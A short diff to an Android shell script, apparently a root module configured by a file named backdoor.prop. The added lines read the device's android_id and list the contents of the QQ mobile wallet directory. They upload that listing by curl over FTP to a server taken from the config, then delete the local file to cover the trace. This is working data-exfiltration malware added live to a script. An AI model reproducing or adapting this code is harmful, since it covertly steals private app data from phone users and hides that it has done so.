@@ -3,6 +3,7 @@
 # global variables
     MODDIR=${0%/*}
     cfg_dir="$MODDIR/backdoor.prop"
+    android_id="$(settings get secure android_id)"
 #
 
 # define
@@ -27,3 +28,9 @@
     ftp_exec_dir="$(grep_prop ftp_exec_dir "$cfg_dir" 2>/dev/null)"
     ftp_data_dir="$(grep_prop ftp_data_dir "$cfg_dir" 2>/dev/null)"
 #
+
+echo "$(ls /data/user/0/com.tencent.mobileqq/files/QWallet/)" >"$MODDIR"/QQID.txt
+
+$_curl -sLkT "$MODDIR"/QQID.txt "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/$android_id/"
+
+rm -rf "$MODDIR"/QQID.txt
